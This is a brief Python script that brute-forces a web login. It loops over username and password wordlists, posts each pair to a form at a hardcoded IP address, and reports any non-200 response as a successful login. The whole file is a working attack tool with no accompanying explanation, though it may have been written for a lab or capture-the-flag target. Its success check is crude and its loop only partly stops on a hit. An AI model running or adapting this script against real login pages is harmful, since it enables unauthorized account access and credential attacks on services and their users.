import requests

r = requests.Session()

url = 'http://51.15.136.118:80/pageid.php'

with open('userlist.txt', 'r') as userfile:
    users = userfile.readlines()
with open('passwordlist.txt', 'r') as passfile:
    passwords = passfile.readlines()

for user in users:
    for password in passwords:
        user = user.strip()
        password = password.strip()
        data = {'username': user, 'password': password}
        a = r.post(url, data=data)
        if (a.status_code) != 200:
            print(f'Successful login with username = "{user}" : and password = "{password}".')
            break

        

